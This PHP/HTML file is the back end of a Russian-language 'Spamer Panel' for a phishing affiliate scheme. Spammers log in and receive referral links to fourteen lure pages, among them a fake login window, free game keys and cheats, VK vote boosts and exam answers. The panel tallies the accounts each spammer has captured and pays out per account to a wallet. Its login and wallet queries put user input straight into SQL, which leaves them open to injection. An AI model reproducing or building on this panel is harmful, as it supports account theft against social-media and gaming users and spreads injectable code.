<?  session_start();
require '../bdlog.php';
$logi = $_SESSION['loging'];

if(isset($_GET['withdraw'])) {
 echo "<script>alert(\"Запрос отправлен\");</script>";
 echo '<META HTTP-EQUIV="REFRESH" CONTENT="0;URL=../lightadmin">';
}

if($logi != 1) {
	
	if(isset($_POST['login'])) { 
	$log = $_POST['login'];
	$pwd = $_POST['pass'];
	$search = mysqli_query($db,"select * from slito where `spamer` = '$log' and `pass` = '$pwd'");
	$searchtwo = mysqli_num_rows($search);
	$srcf = mysqli_fetch_array($search);
	$_SESSION['loging'] = $searchtwo;
	$_SESSION['spamer'] = $srcf['spamer'];
	echo '<META HTTP-EQUIV="REFRESH" CONTENT="0">';
	}
	
	$textbl = 'Spamer Panel:';
	$linkwork = '
	<div style="margin: 0 auto;
    margin-top: 0px;
margin-top: 12%;
max-width: 400px;
text-align: center;">
<form method="post">
<input style="text-align:center;width: 250px;background-color:#3D3F54;height:50px;border-radius: 20px;padding-left:10px;resize: none;border: 2px solid #ccc;font-size: 14px;color:#C2C7D0;" type="text" name="login" required value="" placeholder="Логин"><br><br>
<input style="text-align:center;width: 250px;background-color:#3D3F54;height:50px;border-radius: 20px;padding-left:10px;resize: none;border: 2px solid #ccc;font-size: 14px;color:#C2C7D0;" type="password" name="pass" required value="" placeholder="Пароль"><br><br>
<button type="submit" style="width: 250px;background-color:#3D3F54;height:50px;border-radius: 20px;padding-left:10px;resize: none;border: 2px solid #ccc;font-size: 14px;color:#C2C7D0;">Войти</button></form></div>';
} else {
	
	
	
	$sp = $_SESSION['spamer'];
	$search = mysqli_query($db,"select * from slito where `spamer` = '$sp'");
	$seart = mysqli_query($db,"select * from settings");
	$srf = mysqli_fetch_array($search);
	$srd = mysqli_fetch_array($seart);
	$spamid = $srf['spamer'];
	$textob = $srd['textob'];
	$searchtwo = mysqli_num_rows($search);
	$textbl = 'Твои ссылки для работы: (копировать чуть выше текста, скоро пофиксим)';
    $linkwork = 'Окно входа: '.$host.'auth/?reff='.$spamid;
	$linkwork2 = 'Бесплатные читы: '.$host.'cheats/?reff='.$spamid;
    $linkwork3 = 'Подписка на BOOM: '.$host.'boom/?reff='.$spamid;
    $linkwork4 = 'Рулетка стикеров: '.$host.'stickers/?reff='.$spamid;
    $linkwork5 = 'Раздача WarFace: '.$host.'warface/?reff='.$spamid;
    $linkwork6 = 'Сбив цены Али: '.$host.'aliex/?reff='.$spamid;
    $linkwork7 = 'Бесплатный ключ PUBG: '.$host.'magazine/?reff='.$spamid;
    $linkwork8 = 'Бесплатные стикеры: '.$host.'freesticks/?reff='.$spamid;
	$linkwork9 = 'Ответы ЕГЭ|ОГЭ: '.$host.'otvets/?reff='.$spamid;
	$linkwork10 = 'Бесплатные голоса '.$host.'golos/?reff='.$spamid;
	$linkwork11 = 'Голосование ВК '.$host.'vote7241/?reff='.$spamid;
	$linkwork12 = 'Накрутка ВК '.$host.'nakrutka/?reff='.$spamid;
	$linkwork13 = 'Петиция '.$host.'change/?reff='.$spamid;
	$linkwork14 = 'Закрытая группа ВК '.$host.'closed_group/?reff='.$spamid;
    $spamakk = $db->query("SELECT * FROM data WHERE fromsp = '$spamid'");
    $spamacc = $spamakk->num_rows;
	$textfl = 'Распространяй их для того, чтобы заработать';
	$ispurse = $srf['purse'];
	if(isset($_POST['purse'])) { 
	$pr = $_POST['purse'];
	mysqli_query($db,"update slito set `purse` = '$pr' where `spamer` = '$sp'");
	echo '<META HTTP-EQUIV="REFRESH" CONTENT="0">';
	}
	
	
	if($srf['purse'] == ''){
		$pursen = '
<form method="post"><br>
<input type="text" name="purse" required value="" style="color:#DDE3ED;padding:10px;border-radius:6px;border: 2px solid #ccc;font-size:16px;width:400px;margin-bottom:10px;background-color:#3D3F54;" placeholder="Укажи кошелек для выплат"><br>
<button type="submit" style="color:#DDE3ED;padding:10px;border-radius:6px;border: 2px solid #ccc;font-size:16px;width:400px;background-color:#3D3F54;">Сохранить</button></form>';
	} else { $pursen = '
		<form method="post"><br>
<input type="text" name="purse" required value="" style="color:#DDE3ED;padding:10px;border-radius:6px;border: 2px solid #ccc;font-size:16px;width:400px;margin-bottom:10px;background-color:#3D3F54;" placeholder="Ты можешь изменить кошелек для выплат"><br>
<button type="submit" style="color:#DDE3ED;padding:10px;border-radius:6px;border: 2px solid #ccc;font-size:16px;width:400px;background-color:#3D3F54;">Изменить</button></form>
		'; }
}
?>


<!DOCTYPE html><html><head><meta http-equiv="X-UA-Compatible" content="IE=edge" /><meta charset="utf-8" /><meta name="viewport" content="width=device-width, initial-scale=1.0"><link type="text/css" rel="stylesheet" href="assets/3.2/default.css"></link><title>Spam Panel</title></head><body class="area "><div class="area font-text-opensans font-header-ttnormsmedium"><style>.node35 > .wrapper1 { color: #333 }
.node35 > .wrapper1 > .wrapper2 { padding-top: 20px; padding-right: 5px; padding-bottom: 5px; padding-left: 5px }
.node35 a { color: rgb(25, 100, 230) }


.node44 > .wrapper1 { color: #333 }
.node44 > .wrapper1 > .wrapper2 { padding-top: 0px; padding-right: 5px; padding-bottom: 5px; padding-left: 5px }
.node44 a { color: rgb(25, 95, 230) }


.node41 > .wrapper1 { color: #333 }
.node41 > .wrapper1 > .wrapper2 { padding-top: 8px; padding-right: 5px; padding-bottom: 8px; padding-left: 5px }
.node41 a { color: rgb(25, 95, 230) }


.node42 > .wrapper1 { color: #333 }
.node42 > .wrapper1 > .wrapper2 { padding-top: 0px; padding-right: 5px; padding-bottom: 0px; padding-left: 5px }
.node42 a { color: rgb(25, 95, 230) }


#node39_meta .date1-root1,
#node39_meta .date1-root2 {
  display: flex;
  flex-wrap: wrap;
}

#node39_meta .date1-left {
  width: 170px;
  padding: 15px 15px;
  border-right: 1px solid rgba(51, 51, 51, 0.075);
}

#node39_meta .date1-right {
  flex: 1;
  padding: 30px;
}

#node39_meta .date1-root1 > div {
  padding-bottom: 0px;
}

#node39_meta .date1-root2 > div {
  padding-top: 15px;
}

.screen-xs #node39_meta .date1-left {
  width: 100%;
  border-right: none;
}

.screen-xs #node39_meta .date1-root1 > div,
.screen-xs #node39_meta .date1-root2 > div {
  padding: 15px;
}

.node39 > .wrapper1 { background-color: #3D3F54; color: #333; border-radius: 6px; box-shadow:  0px 9px 28px -10px rgba(156, 175, 196, 0.4) }
.node39 > .wrapper1 > .wrapper2 { padding-top: 0px; padding-right: 0px; padding-bottom: 0px; padding-left: 0px; border-radius: 3px }
.node39 a { color: rgb(25, 95, 230) }


.node38 > .wrapper1 { color: #333 }
.node38 > .wrapper1 > .wrapper2 { padding-top: 5px; padding-right: 150px; padding-bottom: 5px; padding-left: 150px }
.screen-xs .node38 > .wrapper1 > .wrapper2 { padding-right: 5px!important; padding-left: 5px!important }
.screen-sm .node38 > .wrapper1 > .wrapper2 { padding-right: 25px!important; padding-left: 25px!important }
.node38 a { color: rgb(25, 100, 230) }


.node34 > .wrapper1 { background-color: rgb(243, 247, 254); color: #333 }
.node34 > .wrapper1 > .wrapper2 { padding-top: 1px; padding-bottom: 84px }
.node34 a { color: rgb(25, 100, 230) }


.node20 > .wrapper1 { color: #333 }
.node20 > .wrapper1 > .wrapper2 { padding-top: 5px; padding-right: 5px; padding-bottom: 5px; padding-left: 5px }
.node20 a { color: rgb(25, 100, 230) }


.node21 > .wrapper1 { color: #333 }
.node21 > .wrapper1 > .wrapper2 { padding-top: 5px; padding-right: 5px; padding-bottom: 5px; padding-left: 5px }
.node21 a { color: rgb(25, 100, 230) }


div.area.screen-lg { min-width: 1170px; }div.area.screen-lg .container { width: 1170px; }div.area.screen-lg .container.soft { max-width: 1170px; }div.area.screen-md { min-width: 970px; }div.area.screen-md .container { width: 970px; }div.area.screen-md .container.soft { max-width: 970px; }div.area.screen-sm { min-width: 750px; }div.area.screen-sm .container { width: 750px; }div.area.screen-sm .container.soft { max-width: 750px; }div.area.screen-xs .container { max-width: 767px; }</style><script>if(!plp.screenSizes)
                    {
                         plp.screenSizes = {
                           sm:768,
                           md:992,
                           lg:1200,
                         };
                    }
                    if (plp.screens === 'screens-xs') plp.screen = 'xs';
                    else if (plp.screens === 'screens-sm') plp.screen = 'sm';
                    else if (plp.screens === 'screens-md') plp.screen = 'md';
                    else if (plp.screens === 'screens-lg') plp.screen = 'lg';
                    else if (plp.screens === 'screens-xs-sm') {
                        if (document.body.clientWidth >= 768) plp.screen = 'sm';
                        else if (document.body.clientWidth <= 767) plp.screen = 'xs';
                    } else if (plp.screens === 'screens-xs-md') {
                        if (document.body.clientWidth >= 992) plp.screen = 'md';
                        else if (document.body.clientWidth <= 991) plp.screen = 'xs';
                    } else if (plp.screens === 'screens-xs-lg') {
                        if (document.body.clientWidth >= 1200) plp.screen = 'lg';
                        else if (document.body.clientWidth <= 1199) plp.screen = 'xs';
                    } else if (plp.screens === 'screens-sm-md') {
                        if (document.body.clientWidth >= 992) plp.screen = 'md';
                        else if (document.body.clientWidth <= 991) plp.screen = 'sm';
                    } else if (plp.screens === 'screens-sm-lg') {
                        if (document.body.clientWidth >= 1200) plp.screen = 'lg';
                        else if (document.body.clientWidth <= 1199) plp.screen = 'sm';
                    } else if (plp.screens === 'screens-md-lg') {
                        if (document.body.clientWidth >= 1200) plp.screen = 'lg';
                        else if (document.body.clientWidth <= 1199) plp.screen = 'md';
                    } else if (plp.screens === 'screens-xs-sm-md') {
                        if (document.body.clientWidth >= 992) plp.screen = 'md';
                        else if (document.body.clientWidth >= 768 && document.body.clientWidth <= 991) plp.screen = 'sm';
                        else if (document.body.clientWidth <= 767) plp.screen = 'xs';
                    } else if (plp.screens === 'screens-xs-sm-lg') {
                        if (document.body.clientWidth >= 1200) plp.screen = 'lg';
                        else if (document.body.clientWidth >= 768 && document.body.clientWidth <= 1199) plp.screen = 'sm';
                        else if (document.body.clientWidth <= 767) plp.screen = 'xs';
                    } else if (plp.screens === 'screens-xs-md-lg') {
                        if (document.body.clientWidth >= 1200) plp.screen = 'lg';
                        else if (document.body.clientWidth >= 992 && document.body.clientWidth <= 1199) plp.screen = 'md';
                        else if (document.body.clientWidth <= 991) plp.screen = 'xs';
                    } else if (plp.screens === 'screens-sm-md-lg') {
                        if (document.body.clientWidth >= 1200) plp.screen = 'lg';
                        else if (document.body.clientWidth >= 992 && document.body.clientWidth <= 1199) plp.screen = 'md';
                        else if (document.body.clientWidth <= 991) plp.screen = 'sm';
                    } else if (plp.screens === 'screens-xs-sm-md-lg') {
                        if (document.body.clientWidth >= 1200) plp.screen = 'lg';
                        else if (document.body.clientWidth >= 992 && document.body.clientWidth <= 1199) plp.screen = 'md';
                        else if (document.body.clientWidth >= 768 && document.body.clientWidth <= 991) plp.screen = 'sm';
                        else if (document.body.clientWidth <= 767) plp.screen = 'xs';
                    }
                    [].slice.call(document.body.childNodes).forEach(function (el) {
                        if (el.className && el.className.indexOf('area') >= 0) {
                            el.classList.add('screen-' + plp.screen);
                        }
                    });</script>
					
					
					<?=$msg?>
					<div class="node node34 section section-clear"><div class="wrapper1"><div class="wrapper2"><div class="container"><div class="cont"><div class="node node35 widget widget-text"><div class="wrapper1"><div class="wrapper2"><div class="xs-scale-80"><h2 class="font-header spans xs-force-center textable gray-theme"><span style="font-size: 34px; text-align: center;" class="p"><span style="font-family: Bebas\ Neue\ Regular;color:#3D3F54;"><span style="font-size: 28px;"><?=$textbl?></span></span></span><span style="font-size: 34px; text-align: center;" class="p">
					<hr>
					<span style="font-family: TTNorms\ Regular;color:#3D3F54;"><span style="font-size: 20px;"><?=$linkwork?></span></span>	
					<br>
					<span style="font-family: TTNorms\ Regular;margin-top:2px;color:#3D3F54;"><span style="font-size: 20px;"><?=$linkwork2?></span></span>
					<br>
					<span style="font-family: TTNorms\ Regular;margin-top:2px;color:#3D3F54;"><span style="font-size: 20px;"><?=$linkwork3?></span></span>
					<br>
					<span style="font-family: TTNorms\ Regular;margin-top:2px;color:#3D3F54;"><span style="font-size: 20px;"><?=$linkwork4?></span></span>
					<br>
					<span style="font-family: TTNorms\ Regular;margin-top:2px;color:#3D3F54;"><span style="font-size: 20px;"><?=$linkwork5?></span></span>
					<br>
					<span style="font-family: TTNorms\ Regular;margin-top:2px;color:#3D3F54;"><span style="font-size: 20px;"><?=$linkwork6?></span></span>
					<br>
					<span style="font-family: TTNorms\ Regular;margin-top:2px;color:#3D3F54;"><span style="font-size: 20px;"><?=$linkwork7?></span></span>
					<br>
					<span style="font-family: TTNorms\ Regular;margin-top:2px;color:#3D3F54;"><span style="font-size: 20px;"><?=$linkwork8?></span></span>
					<br>
					<span style="font-family: TTNorms\ Regular;margin-top:2px;color:#3D3F54;"><span style="font-size: 20px;"><?=$linkwork9?></span></span>
					<br>
					<span style="font-family: TTNorms\ Regular;margin-top:2px;color:#3D3F54;"><span style="font-size: 20px;"><?=$linkwork10?></span></span>
					<br>
					<span style="font-family: TTNorms\ Regular;margin-top:2px;color:#3D3F54;"><span style="font-size: 20px;"><?=$linkwork11?></span></span>
					<br>
					<span style="font-family: TTNorms\ Regular;margin-top:2px;color:#3D3F54;"><span style="font-size: 20px;"><?=$linkwork12?></span></span>
					<br>
					<span style="font-family: TTNorms\ Regular;margin-top:2px;color:#3D3F54;"><span style="font-size: 20px;"><?=$linkwork13?></span></span>
					<br>
					<span style="font-family: TTNorms\ Regular;margin-top:2px;color:#3D3F54;"><span style="font-size: 20px;"><?=$linkwork14?></span></span>
					<br>
					<span style="font-size: 34px; text-align: center;" class="p"><span style="font-family: TTNorms\ Regular;"><span style="font-size: 28px;"><?=$pursen?></span></span></span>
					<span style="font-family: Bebas\ Neue\ Light;"><span style="font-size: 28px;"><br></span></span></span></h2></div></div></div></div><div class="node node38 widget widget-element">
					
					
					<? 
										
					
				
					$ress = mysqli_query($db,"select * from slito where `spamer` = '$spamid'  group by id");
					while ($op = $ress->fetch_array()) {
						if ($textob <> '') {
						echo '<div class="wrapper1"><div class="wrapper2"><div class="cont"><div class="node node39 widget widget-metahtml"><div class="wrapper1"><div class="wrapper2"><div class="metahtml"><div id="node39_meta" class="code"><div class="date1-root1">
 <div class="date1-left">
 <div class="cont"><div class="node node44 widget widget-text"><div class="wrapper1"><div class="wrapper2"><div class="flex"><div class="font-header xs-force-center textable gray-theme"><p style="text-align: center;    margin-top: -5px;"><span style="font-size: 14px;color:yellow;">ОБЪЯВЛЕНИЕ<br></span></p></div></div></div></div></div></div>
 </div>
 <div class="date1-right">
					<div class="cont" style="margin-top: -25px;"><div class="node node41 widget widget-text"><div class="wrapper1"><div class="wrapper2"><div class=""><h3 class="font-header spans xs-force-center textable gray-theme"><span style="font-size: 18px; letter-spacing: 0.1em;" class="p"><span style="font-size: 14px;color:yellow;text-transform:uppercase;">'.$textob.'<br></span></span></h3></div></div></div></div></div> </div></div></div></div></div></div></div></div></div></div>';
						}
					echo '<div class="wrapper1"><div class="wrapper2"><div class="cont"><div class="node node39 widget widget-metahtml"><div class="wrapper1"><div class="wrapper2"><div class="metahtml"><div id="node39_meta" class="code"><div class="date1-root1">
 <div class="date1-left">
 <div class="cont"><div class="node node44 widget widget-text"><div class="wrapper1"><div class="wrapper2"><div class="flex"><div class="font-header xs-force-center textable gray-theme"><p style="text-align: center;    margin-top: -5px;"><span style="font-size: 14px;color:yellow;">'.$op['inviteusers'].'<br></span></p></div></div></div></div></div></div>
 </div>
 <div class="date1-right">
					<div class="cont" style="margin-top: -25px;"><div class="node node41 widget widget-text"><div class="wrapper1"><div class="wrapper2"><div class=""><h3 class="font-header spans xs-force-center textable gray-theme"><span style="font-size: 18px; letter-spacing: 0.1em;" class="p"><span style="font-size: 14px;">Вами привлечено аккаунтов<br></span></span></h3></div></div></div></div></div> </div></div></div></div></div></div></div></div></div></div>  ';
					
					$wthr = ($op['inviteusers'] * $tarif);
					if($wthr >= $minbal) {
						if(isset($_GET['withdraw'])) {
							mysqli_query($db,"update slito set `wantwith` = 1 where `spamer` = '$spamid'");
						}
						
						$withbutton = '<a href="?withdraw=ok"><button name="zapros" style="margin-left:10px; border:1px solid white;background-color:#50526E;font-weight:0;font-size:14px;color:yellow;border-radius: 4px;">Вывести</button></a>';
					} else { 
					$withbutton = '<a><button disabled style="margin-left:10px; border:1px solid white;background-color:#50526E;font-weight:0;font-size:14px;color:#F3F7FE;border-radius: 4px;">Вывести</button></a>';
					}
					echo '<div class="wrapper1"><div class="wrapper2"><div class="cont"><div class="node node39 widget widget-metahtml"><div class="wrapper1"><div class="wrapper2"><div class="metahtml"><div id="node39_meta" class="code"><div class="date1-root1">
 <div class="date1-left">
 <div class="cont"><div class="node node44 widget widget-text"><div class="wrapper1"><div class="wrapper2"><div class="flex"><div class="font-header xs-force-center textable gray-theme"><p style="text-align: center;    margin-top: -5px;"><span style="font-size: 14px;color:yellow;">'.$wthr.' Р  '.$withbutton.'<br></span></p></div></div></div></div></div></div>
 </div>
 <div class="date1-right">
					<div class="cont" style="margin-top: -25px;"><div class="node node41 widget widget-text"><div class="wrapper1"><div class="wrapper2"><div class=""><h3 class="font-header spans xs-force-center textable gray-theme"><span style="font-size: 18px; letter-spacing: 0.1em;" class="p"><span style="font-size: 14px;">Ваша выплата согласно тарифу - '.$tarif.' Р/акк | Минимальная выплата - '.$minbal.' Р | Нажмите один раз "Вывести", чтобы запросить выплату<br></span></span></h3></div></div></div></div></div> </div></div></div></div></div></div></div></div></div></div>  ';
					echo '<div class="wrapper1"><div class="wrapper2"><div class="cont"><div class="node node39 widget widget-metahtml"><div class="wrapper1"><div class="wrapper2"><div class="metahtml"><div id="node39_meta" class="code"><div class="date1-root1">
 <div class="date1-left">
 <div class="cont"><div class="node node44 widget widget-text"><div class="wrapper1"><div class="wrapper2"><div class="flex"><div class="font-header xs-force-center textable gray-theme"><p style="text-align: center;    margin-top: -5px;"><span style="font-size: 14px;color:yellow;">'.$op['purse'].'<br></span></p></div></div></div></div></div></div>
 </div>
 <div class="date1-right">
					<div class="cont" style="margin-top: -25px;"><div class="node node41 widget widget-text"><div class="wrapper1"><div class="wrapper2"><div class=""><h3 class="font-header spans xs-force-center textable gray-theme"><span style="font-size: 18px; letter-spacing: 0.1em;" class="p"><span style="font-size: 14px;">Кошелек для выплат<br></span></span></h3></div></div></div></div></div> </div></div></div></div></div></div></div></div></div></div>';
					
					
					} ?>

</div></div></div><span class="plplink"></span></div></div></div><div class="node section section-helper"><div class="macros-modal"><div class="modal fade nocolors robots-noindex robots-nocontent" data-modal="agreement" area-context="uid15"><!--googleoff: all--><!--noindex--><div class="modal-dialog" style="width: 600px;"><div class="modal-content"><div class="modal-header"><button class="close nofonts">×</button><h4 class="textable"><p>Политика конфиденциальности</p></h4></div><div class="modal-body"><div class="cont"><div class="node node20 widget widget-text"><div class="wrapper1"><div class="wrapper2"><div class=""><div class="xs-force-center textable"><p>Редактируемый текст</p></div></div></div></div></div></div></div></div></div><!--/noindex--><!--googleon: all--></div></div><div class="macros-modal"><div class="modal fade nocolors" data-modal="cookie" area-context="uid16"><div class="modal-dialog" style="width: 600px;"><div class="modal-content"><div class="modal-header"><button class="close nofonts">×</button><h4 class="textable"><p>Данный сайт использует Cookie</p></h4></div><div class="modal-body"><div class="cont"><div class="node node21 widget widget-text"><div class="wrapper1"><div class="wrapper2"><div class=""><div class="xs-force-center textable"><p>Редактируемый текст</p></div></div></div></div></div></div></div></div></div></div></div><div class="eventmodals" disableevent="1"></div></div></div></body></html>